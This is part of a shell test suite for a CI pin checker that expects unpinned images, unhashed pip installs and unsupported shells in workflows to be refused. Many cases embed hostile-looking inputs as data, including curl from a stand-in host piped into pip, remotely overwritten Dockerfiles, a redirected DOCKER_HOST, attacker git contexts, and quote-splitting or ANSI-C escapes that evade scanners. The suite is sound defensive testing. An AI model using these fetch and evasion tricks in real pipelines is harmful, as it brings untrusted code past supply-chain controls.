case_ n3-download-hashed       ok  "$(rb 'pip download --require-hashes -r r.txt -d /tmp/w')" "printf 'x==1 --hash=sha256:00\\n' > r.txt"
case_ n4-conda                 bad "$(r 'conda install -y requests')"
case_ n4-mamba                 bad "$(r 'micromamba create -n x python')"
case_ r1-manifest              bad "$(r 'docker manifest create multi alpine:latest busybox@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667')"
case_ r1-imagetools            bad "$(r 'docker buildx imagetools create -t ghcr.io/x/out:1 alpine:latest')"
case_ r1-imagetools-pinned     ok  "$(r 'docker buildx imagetools create -t ghcr.io/x/out:1 alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667 busybox@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667')"

# --- Sonnet #164 r3 (fixed after the cap): other container CLIs, other Python installers and build frontends
case_ x1-buildah               bad "$(r 'buildah pull alpine:latest')"
case_ x1-nerdctl               bad "$(r 'nerdctl run alpine:latest true')"
case_ x1-ctr                   bad "$(r 'ctr image pull docker.io/library/alpine:latest')"
case_ x1-crictl                bad "$(r 'crictl pull alpine:latest')"
case_ x2-uv-pip-sync           bad "$(r 'uv pip sync requirements.txt')"
case_ x2-uv-add                bad "$(r 'uv add requests')"
case_ x2-uv-run-with           bad "$(r 'uv run --with requests script.py')"
case_ x2-pipenv                bad "$(r 'pipenv install requests')"
case_ x2-poetry                bad "$(r 'poetry add requests')"
case_ x2-pip-sync              bad "$(r 'pip-sync requirements.txt')"
case_ x2-setup-py              bad "$(r 'python setup.py install')"
case_ x2-python-m-build        bad "$(r 'python3 -m build')"
case_ x2-uv-pip-sync-hashed    ok  "$(r 'uv pip sync --require-hashes -r requirements.txt')" "printf 'x==1 --hash=sha256:00\\n' > requirements.txt"
case_ x2-python-script         ok  "$(r 'python3 bin/check.py --sync install')"

# --- Sonnet #164 r4 (NEW-3, NEW-4): a decoy Dockerfile; command substitution severing the image argument
case_ n3-absolute-dockerfile   bad "$(rb 'docker build -f /tmp/Dockerfile .')" "mkdir -p sub; printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > sub/Dockerfile"
case_ n3-written-dockerfile    bad "$(rb 'printf "FROM alpine:latest\\n" > Dockerfile; docker build .')" "mkdir -p sub; printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > sub/Dockerfile"
case_ n3-tee-dockerfile        bad "$(rb 'echo FROM alpine | tee Dockerfile.prod >/dev/null; docker build -f Dockerfile.prod .')" "printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > Dockerfile.prod"
case_ n4-subst-run             bad "$(rb 'docker run $(echo alpine:latest) true')"
case_ n4-backtick-run          bad "$(rb 'docker run `echo alpine:latest` true')"
case_ n4-subst-quoted          bad "$(rb 'docker run "$(echo alpine:latest)" true')"
case_ n4-subst-skopeo          bad "$(rb 'skopeo copy $(echo docker://alpine:latest) dir:/tmp/x')"
case_ n4-subst-crane           bad "$(rb 'crane pull $(echo alpine:latest) out.tar')"
case_ n4-subst-imagetools      bad "$(rb 'docker buildx imagetools create -t m:1 $(echo alpine:latest)')"
case_ n4-subst-pip             bad "$(rb 'pip install --require-hashes -r r.txt $(cat extra)')"
case_ n4-inner-still-read      bad "$(rb 'x=$(docker pull alpine:latest)')"
case_ n4-nested                bad "$(rb 'docker run $(printf %s $(echo alpine)) true')"
case_ n4-subst-option-ok       ok  "$(rb 'docker run --name "$(date +%s)" --rm alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667 true')"

# --- Sonnet #164 r5 (NEW-5, NEW-6): a committed Dockerfile mutated by any tool; pip -r bound to the repository
case_ n5-curl-o                bad "$(rb 'curl -fsSL -o Dockerfile https://x.example/D && docker build -t x .')" "printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > Dockerfile"
case_ n5-python-write          bad "$(rb 'python3 -c "open(\"Dockerfile\",\"w\").write(\"FROM alpine\")"; docker build -t x .')" "printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > Dockerfile"
case_ n5-dd                    bad "$(rb 'echo FROM alpine | dd of=Dockerfile; docker build -t x .')" "printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > Dockerfile"
case_ n5-sed-i                 bad "$(rb 'sed -i s/x/y/ Dockerfile && docker build -t x .')" "printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > Dockerfile"
case_ n5-echo-redirect         bad "$(rb 'echo FROM alpine >Dockerfile; docker build -t x .')" "printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > Dockerfile"
case_ n5-read-only-ok          ok  "$(rb 'cat Dockerfile; sha256sum Dockerfile; grep FROM Dockerfile; docker build -t x .')" "printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > Dockerfile"
case_ n6-r-absolute            bad "$(r 'pip install --require-hashes -r /tmp/nonexistent.txt')"
case_ n6-r-written             bad "$(rb 'printf "x==1 --hash=sha256:00\\n" > r.txt; pip install --require-hashes -r r.txt')" "printf 'x==1 --hash=sha256:00\\n' > r.txt"
case_ n6-r-missing             bad "$(r 'pip install --require-hashes -r reqs/none.txt')"
case_ n6-r-repo-file           ok  "$(r 'pip install --require-hashes -r reqs/ok.txt')" "mkdir -p reqs; printf 'x==1 --hash=sha256:00\\n' > reqs/ok.txt"
case_ n6-r-stdin-heredoc       ok  "$head
    steps:
      - run: |
          pip install --require-hashes -r /dev/stdin <<'REQ'
          x==1 --hash=sha256:00
          REQ"
case_ n6-r-stdin-no-heredoc    bad "$(rb 'curl -s https://x.example/r | pip install --require-hashes -r /dev/stdin')"
case_ n6-r-variable-review     ok  "$(rb 'for f in a b; do pip install --require-hashes -r "$f"; done')"
case_ n5-copy-into-context     ok  "$(rb 'cp build/docker/Dockerfile.* /tmp/ctx/ && cd /tmp/ctx && docker build -f Dockerfile.$v .')" "mkdir -p build/docker; printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > build/docker/Dockerfile.a"
case_ n5-copy-from-outside     bad "$(rb 'cp /tmp/evil/Dockerfile.a /tmp/ctx/ && cd /tmp/ctx && docker build -f Dockerfile.$v .')" "mkdir -p build/docker; printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > build/docker/Dockerfile.a"
case_ n5-copy-onto-name        bad "$(rb 'cp evil.txt Dockerfile.a && docker build -f Dockerfile.$v .')" "mkdir -p build/docker; printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > build/docker/Dockerfile.a"
case_ n5-touch-in-subst        bad "$(rb 'x=$(sed -i s/a/b/ Dockerfile); docker build -t x .')" "printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > Dockerfile"
case_ n6-r-equals-form         ok  "$(r 'pip install --require-hashes --requirement=reqs/ok.txt')" "mkdir -p reqs; printf 'x==1 --hash=sha256:00\\n' > reqs/ok.txt"
case_ n6-r-attached-form       ok  "$(r 'pip install --require-hashes -rreqs/ok.txt')" "mkdir -p reqs; printf 'x==1 --hash=sha256:00\\n' > reqs/ok.txt"
case_ n6-r-from-subst          bad "$(rb 'pip install --require-hashes -r $(echo reqs/ok.txt)')" "mkdir -p reqs; printf 'x==1 --hash=sha256:00\\n' > reqs/ok.txt"
# --- Sonnet #164 r6 (NEW-7): a file changed in an EARLIER step of the same job
case_ n7-earlier-step-docker   bad "$head
    steps:
      - run: sed -i s/a/b/ Dockerfile
      - run: docker build -t x ." "printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > Dockerfile"
case_ n7-earlier-step-pip      bad "$head
    steps:
      - run: echo 'x==1 --hash=sha256:00' > reqs/ok.txt
      - run: pip install --require-hashes -r reqs/ok.txt" "mkdir -p reqs; printf 'x==1 --hash=sha256:00\\n' > reqs/ok.txt"
case_ n7-other-job-ok          ok  "$head
    steps:
      - run: docker build -t x .
  k:
    runs-on: ubuntu-latest
    steps:
      - run: cat Dockerfile" "printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > Dockerfile"
case_ n7-for-list-ok           ok  "$head
    steps:
      - run: for r in reqs/a.txt reqs/b.txt; do pip install --dry-run --require-hashes -r \"\$r\"; done
      - run: if grep -q x reqs/a.txt; then pip install --require-hashes -r reqs/a.txt; fi" "mkdir -p reqs; printf 'x==1 --hash=sha256:00\\n' > reqs/a.txt; cp reqs/a.txt reqs/b.txt"
case_ n7-if-then-write         bad "$head
    steps:
      - run: if true; then echo 'x==1 --hash=sha256:00' > reqs/a.txt; fi
      - run: pip install --require-hashes -r reqs/a.txt" "mkdir -p reqs; printf 'x==1 --hash=sha256:00\\n' > reqs/a.txt"
# --- Sonnet #164 r7 (NEW-8): every tool the POSIX scanner knows is also caught in a non-POSIX step
case_ n8-pwsh-buildah          bad "$head
    steps:
      - shell: pwsh
        run: buildah run x"
case_ n8-pwsh-nerdctl          bad "$head
    steps:
      - shell: pwsh
        run: nerdctl run alpine"
case_ n8-pwsh-ctr              bad "$head
    steps:
      - shell: pwsh
        run: ctr image pull x"
case_ n8-pwsh-crictl           bad "$head
    steps:
      - shell: pwsh
        run: crictl pull x"
case_ n8-pwsh-pipenv           bad "$head
    steps:
      - shell: pwsh
        run: pipenv install x"
case_ n8-pwsh-poetry           bad "$head
    steps:
      - shell: pwsh
        run: poetry add x"
case_ n8-pwsh-uv               bad "$head
    steps:
      - shell: pwsh
        run: uv add x"
case_ n8-pwsh-conda            bad "$head
    steps:
      - shell: pwsh
        run: conda install x"
case_ n8-pwsh-micromamba       bad "$head
    steps:
      - shell: pwsh
        run: micromamba create x"
case_ n8-pwsh-docker-compose   bad "$head
    steps:
      - shell: pwsh
        run: docker-compose up"
case_ n8-pwsh-rye              bad "$head
    steps:
      - shell: pwsh
        run: rye add x"
case_ n8-pwsh-pip-sync         bad "$head
    steps:
      - shell: pwsh
        run: pip-sync r.txt"
case_ n8-composite-pwsh         bad "$head
    steps:
      - uses: ./.github/actions/x" "mkdir -p .github/actions/x; printf 'runs:\\n  using: composite\\n  steps:\\n    - shell: pwsh\\n      run: buildah pull x\\n' > .github/actions/x/action.yml"
# --- Sonnet #164 r8 (NEW-9, NEW-10): Windows/macOS package managers; case-insensitive tool names; Windows default shell
wh='on: push
jobs:
  j:
    runs-on: windows-latest'
case_ n9-choco-bash              bad "$wh
    steps:
      - shell: bash
        run: choco install -y pkg"
case_ n9-winget-default          bad "$wh
    steps:
      - run: winget install --id Some.Pkg"
case_ n9-scoop                   bad "$wh
    steps:
      - shell: bash
        run: scoop install pkg"
case_ n9-brew                    bad "$wh
    steps:
      - run: brew install jq"
case_ n10-Docker-bash            bad "$wh
    steps:
      - shell: bash
        run: Docker run alpine:latest"
case_ n10-DOCKER-bash            bad "$wh
    steps:
      - shell: bash
        run: DOCKER RUN alpine:latest"
case_ n10-Pip-bash               bad "$wh
    steps:
      - shell: bash
        run: Pip install flask"
case_ n10-windows-default-pwsh   bad "$wh
    steps:
      - run: docker run alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667"
case_ n10-windows-bash-refused bad "$wh
    steps:
      - shell: bash
        run: docker run alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667"
case_ n10-windows-no-tools-refused bad "$wh
    steps:
      - run: Write-Output hi"
case_ n10-expr-runs-on          bad "on: push
jobs:
  j:
    runs-on: \${{ matrix.os }}
    steps:
      - run: docker pull alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667"
# --- advisor 0080: the checker's scope is ubuntu runners; any other runs-on (or one it cannot resolve) fails closed
ro() { printf 'on: push\njobs:\n  j:\n    runs-on: %s\n    steps:\n      - run: true' "$1"; }
case_ ro-ubuntu-latest         ok  "$(ro ubuntu-latest)"
case_ ro-ubuntu-version        ok  "$(ro ubuntu-24.04)"
case_ ro-ubuntu-arm            ok  "$(ro ubuntu-24.04-arm)"
case_ ro-windows               bad "$(ro windows-latest)"
case_ ro-macos                 bad "$(ro macos-14)"
case_ ro-self-hosted-list      bad "$(ro '[self-hosted, linux]')"
case_ ro-expression            bad "$(ro '\${{ matrix.os }}')"
case_ ro-group                 bad "on: push
jobs:
  j:
    runs-on:
      group: big
    steps:
      - run: true"
case_ ro-missing               bad "on: push
jobs:
  j:
    steps:
      - run: true"
case_ ro-reusable-call-ok      ok  "on: push
jobs:
  j:
    uses: ./.github/workflows/w2.yml" "printf 'on: workflow_call\\njobs:\\n  x:\\n    runs-on: ubuntu-latest\\n    steps:\\n      - run: true\\n' > .github/workflows/w2.yml"
# --- Sonnet #164 r9 (NEW-11): a command name computed by a substitution fused into the word fails closed
case_ n11-fused-docker         bad "$(rb 'd$()ocker run alpine')"
case_ n11-fused-pip            bad "$(rb 'pi$()p install requests')"
case_ n11-fused-backtick       bad "$(rb 'doc``ker pull alpine')"
case_ n11-wrapper-fused        bad "$(rb 'timeout 5 d$()ocker run alpine')"
case_ n11-whole-subst-command  bad "$(rb '$(echo docker) run alpine')"
case_ n11-subst-in-argument-ok ok  "$(rb 'echo "built at $(date)"; tag="v$(cat VERSION)"')"
# --- Sonnet #164 r10 (NEW-12): any non-POSIX shell step is refused outright (this check reads POSIX shell only)
case_ n12-pwsh-backtick        bad "$head
    steps:
      - shell: pwsh
        run: doc\\\`ker run alpine"
case_ n12-pwsh-concat          bad "$head
    steps:
      - shell: pwsh
        run: \\\$d = 'dock'; & \\\"\\\${d}er\\\" run alpine"
case_ n12-python-shell         bad "$head
    steps:
      - shell: python
        run: print('hi')"
case_ n12-bash-template-ok     ok  "$head
    steps:
      - shell: bash --noprofile --norc -eo pipefail {0}
        run: echo hi"
# --- Sonnet #164 r11 (NEW-13): a registry-qualified template never stands for "our own bytes"
case_ n13-registry-template    bad "$(rb 'docker tag alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667 ghcr.io/myorg/approved-${GITHUB_SHA}; docker run ghcr.io/myorg/approved-other')"
case_ n13-registry-exact-ok    ok  "$(rb 'docker tag alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667 ghcr.io/myorg/approved; docker run ghcr.io/myorg/approved')"
case_ n13-local-template-ok    ok  "$(rb 'for v in a b; do docker tag "$src" "fa-${v}"; done; docker run fa-production')"
# --- Sonnet #164 r12 (NEW-14, NEW-15): every verb is checked, on a reviewed safe list, or refused
case_ n14-podman-kube-play     bad "$(r 'podman kube play pod.yaml')"
case_ n14-podman-play-kube     bad "$(r 'podman play kube pod.yaml')"
case_ n14-docker-unknown-verb  bad "$(r 'docker frobnicate alpine')"
case_ n15-skopeo-sync          bad "$(r 'skopeo sync --src docker --dest dir alpine /tmp/x')"
case_ n15-crane-append         bad "$(r 'crane append -b alpine:3 -f layer.tar -t ghcr.io/x/y:1')"
case_ n15-crane-mutate         bad "$(r 'crane mutate alpine:3 --entrypoint=sh')"
case_ safe-verbs-ok            ok  "$(rb 'docker login ghcr.io -u x --password-stdin <<<t; docker images; docker ps; docker rm -f x; docker logs x; docker inspect x; docker exec x true; docker push ghcr.io/x/y:1; docker load -i a.tar; docker network create n; docker buildx imagetools inspect x; skopeo inspect --raw docker://x@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667; crane digest x; crane ls x')"
case_ scout-local-ok            ok  "$(rb 'docker scout sbom --format json "local://${ref}" > "${d}/sbom.json"; docker scout cves --format gitlab --vex-location v.json "local://${ref}" > o 2>&1')"
case_ scout-registry-unpinned  bad "$(r 'docker scout cves alpine:latest')"
case_ scout-unknown-option     bad "$(r 'docker scout cves --frob x local://img')"
case_ lookup-not-a-run-ok      ok  "$(r 'command -v skopeo >/dev/null 2>&1 || which docker; type crane')"
case_ prose-in-quotes-ok       ok  "$(rb 'gh release create v1 --notes "images (GHCR canonical, Docker Hub mirror) and more"')"
case_ scout-bare-ok             ok  "$(r 'docker scout')"
case_ scout-flags-ok            ok  "$(r 'docker scout cves --exit-code --format=json local://img')"
case_ safe-subverbs-ok          ok  "$(r 'docker image ls; docker manifest inspect ghcr.io/x/y:1; docker container ls')"
# --- Sonnet #164 r13 (NEW-16..20): no privileged plugins, no daemon redirection, no remote builders, no URL imports
case_ n16-plugin-install       bad "$(r 'docker plugin install vieux/sshfs')"
case_ n17-context-use          bad "$(r 'docker context use remote')"
case_ n18-global-host          bad "$(r 'docker -H tcp://x:2375 ps')"
case_ n18-global-context       bad "$(r 'docker --context remote ps')"
case_ n18-env-docker-host      bad "$(rb 'export DOCKER_HOST=tcp://x:2375; docker ps')"
case_ n18-prefix-docker-host   bad "$(r 'DOCKER_HOST=tcp://x docker ps')"
case_ n18-yaml-env             bad "$head
    env:
      DOCKER_HOST: tcp://x:2375
    steps:
      - run: docker ps"
case_ n18-buildkit-host        bad "$(rb 'export BUILDKIT_HOST=tcp://x; docker buildx ls')"
case_ n18-config-other         bad "$(rb 'export DOCKER_CONFIG=/tmp/attacker; docker ps')"
case_ n18-config-fresh-ok      ok  "$(rb 'DOCKER_CONFIG=$(mktemp -d); export DOCKER_CONFIG; docker ps')"
case_ n19-buildx-remote        bad "$(r 'docker buildx create --driver remote tcp://x:1234 --use')"
case_ n20-import-url           bad "$(r 'docker import https://x.example/rootfs.tar img:1')"
# --- Sonnet #164 r14 (NEW-21, NEW-22): a loaded tarball or an archive copy is never "the job's own bytes"
case_ n21-load-tag-run         bad "$(rb 'curl -sL https://x.example/i.tar -o i.tar; docker load -i i.tar; docker tag sha256:deadbeef myname:latest; docker run myname:latest')"
case_ n21-tag-unpinned-src     bad "$(rb 'docker tag alpine:latest mine; docker run mine')"
case_ n21-tag-pinned-src-ok    ok  "$(rb 'docker tag alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667 mine; docker run mine')"
case_ n21-tag-variable-src-ok  ok  "$(rb 'docker tag "${repo}@${d}" "fa-${v}"; docker run fa-production')"
case_ n22-archive-to-daemon-run bad "$(rb 'skopeo copy oci-archive:/tmp/x.oci docker-daemon:img:1; docker run img:1')"
case_ n22-archive-scan-ok      ok  "$(rb 'skopeo copy oci-archive:/tmp/x.oci docker-daemon:img:1; grype docker:img:1; docker scout cves local://img:1')"
case_ n22-pinned-to-daemon-ok   ok  "$(rb 'skopeo copy docker://alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667 docker-daemon:img:1; docker run img:1')"
# --- Sonnet #164 r15 (NEW-23): a build's context must be a local path; remote or computed contexts are refused
case_ n23-git-url-context      bad "$(r 'docker build https://github.com/attacker/evil.git -f go.mod -t x')" "touch go.mod; printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > Dockerfile"
case_ n23-git-scheme-context   bad "$(r 'docker build git://example.org/r.git -t x')" "printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > Dockerfile"
case_ n23-git-ssh-context      bad "$(r 'docker build git@github.com:a/b.git -t x')" "printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > Dockerfile"
case_ n23-tarball-url-context  bad "$(r 'docker buildx build https://x.example/ctx.tar.gz -t x')" "printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > Dockerfile"
case_ n23-variable-context     bad "$(rb 'docker build -t x "$CTX"')" "printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > Dockerfile"
case_ n23-build-context-image  bad "$(r 'docker buildx build --build-context base=docker-image://alpine:latest -t x .')" "printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > Dockerfile"
case_ n23-build-context-local-ok ok "$(r 'docker buildx build --build-context src=./src -t x .')" "printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > Dockerfile"
case_ n23-local-subdir-ok      ok  "$(r 'docker build -f build/Dockerfile -t x build')" "mkdir -p build; printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > build/Dockerfile"
# --- Sonnet #164 r16 (NEW-24): the default Dockerfile is <context>/Dockerfile; a moved working directory makes literal paths unresolvable
case_ n24-context-dockerfile   bad "$(r 'docker build ./subdir -t x')" "printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > Dockerfile; mkdir -p subdir; printf 'FROM alpine:latest\\n' > subdir/Dockerfile"
case_ n24-context-pinned-ok    ok  "$(r 'docker build ./subdir -t x')" "mkdir -p subdir; printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > subdir/Dockerfile"
case_ n24-cd-literal           bad "$(rb 'cd sub && docker build -f Dockerfile -t x .')" "printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > Dockerfile; mkdir -p sub; printf 'FROM alpine:latest\\n' > sub/Dockerfile"
case_ n24-working-directory    bad "$head
    steps:
      - working-directory: sub
        run: docker build -f Dockerfile -t x ." "printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > Dockerfile; mkdir -p sub; printf 'FROM alpine:latest\\n' > sub/Dockerfile"
case_ n24-cd-template-ok       ok  "$(rb 'cp build/docker/Dockerfile.* /tmp/ctx/ && cd /tmp/ctx && docker build -f Dockerfile.$v .')" "mkdir -p build/docker; printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > build/docker/Dockerfile.a"
case_ n24-dot-slash-ok          ok  "$(r 'docker build -f ./Dockerfile -t x .')" "printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > Dockerfile"
# --- Sonnet #164 r17 (NEW-25, NEW-26): a cd / pushd anywhere in the step, quoted or nested, moves the working directory;
#     a pip -r file read from a moved working directory is refused like a Dockerfile
case_ n25-sh-c-quoted-cd       bad "$(rb "sh -c 'cd evil && docker build -f Dockerfile -t x .'")" "printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > Dockerfile; mkdir -p evil; printf 'FROM ubuntu:latest\\n' > evil/Dockerfile"
case_ n25-eval-quoted-cd       bad "$(rb 'eval "cd evil && docker build -f Dockerfile -t x ."')" "printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > Dockerfile; mkdir -p evil; printf 'FROM ubuntu:latest\\n' > evil/Dockerfile"
case_ n25-quoted-cd-word       bad "$(rb "'cd' evil; docker build -f Dockerfile -t x .")" "printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > Dockerfile; mkdir -p evil; printf 'FROM ubuntu:latest\\n' > evil/Dockerfile"
case_ n26-cd-pip-r             bad "$(rb 'cd sub; pip install --require-hashes -r requirements.txt')" "printf 'x==1 --hash=sha256:00\\n' > requirements.txt; mkdir -p sub; printf 'evil==9 --hash=sha256:11\\n' > sub/requirements.txt"
case_ n26-wd-pip-r             bad "$head
    steps:
      - working-directory: sub
        run: pip install --require-hashes -r requirements.txt" "printf 'x==1 --hash=sha256:00\\n' > requirements.txt; mkdir -p sub; printf 'evil==9 --hash=sha256:11\\n' > sub/requirements.txt"
case_ n26-pip-r-root-ok        ok  "$(rb 'pip install --require-hashes -r requirements.txt')" "printf 'x==1 --hash=sha256:00\\n' > requirements.txt"
# --- Sonnet #164 r18 (NEW-27, NEW-28): quote-split words (d""ocker, c""d) defeat raw-text detectors; aliases and ANSI-C
#     quoting are refused outright (fail closed)
case_ n27-alias-split          bad "$(rb 'shopt -s expand_aliases; alias foo=d""ocker; foo run alpine:3.20')"
case_ n27-alias-any            bad "$(rb 'alias ll=ls; ll')"
case_ n27-expand-aliases       bad "$(rb 'shopt -s expand_aliases')"
case_ n27-ansi-c               bad "$(rb "\$'\\x64ocker' run alpine:3.20")"
case_ n27-ansi-c-octal         bad "$(rb "\$'\\144ocker' run alpine:3.20")"
case_ n27-ansi-c-tab-ok        ok  "$(rb "IFS=\$'\\t' read -r a b <<< \"x\"; printf '%s' \"\$a\$'\\n'\"")"
case_ n27-regex-anchor-ok      ok  "$(rb "grep -oE '[^ ]+\$' f.txt; echo \"a\$'b\"")"
case_ n27-ansi-in-dquote-text  bad "$(rb "echo \"x\" \$'\\x41'")"
case_ n27-cp-split             bad "$(rb 'cp "$(command -v d""ocker)" /usr/local/bin/foo; foo run alpine:3.20')"
case_ n28-cd-split-pip         bad "$(rb 'c""d sub; pip install --require-hashes -r requirements.txt')" "printf 'x==1 --hash=sha256:00\\n' > requirements.txt; mkdir -p sub; printf 'evil==9 --hash=sha256:11\\n' > sub/requirements.txt"
case_ n28-pushd-split-build    bad "$(rb 'pus""hd evil; docker build -f Dockerfile -t x .')" "printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > Dockerfile; mkdir -p evil; printf 'FROM ubuntu:latest\\n' > evil/Dockerfile"
case_ n28-backslash-cd         bad "$(rb 'c\\d evil; docker build -f Dockerfile -t x .')" "printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > Dockerfile; mkdir -p evil; printf 'FROM ubuntu:latest\\n' > evil/Dockerfile"
echo "check-action-pins: $pass passed, $failn failed"
[ "$failn" -eq 0 ]
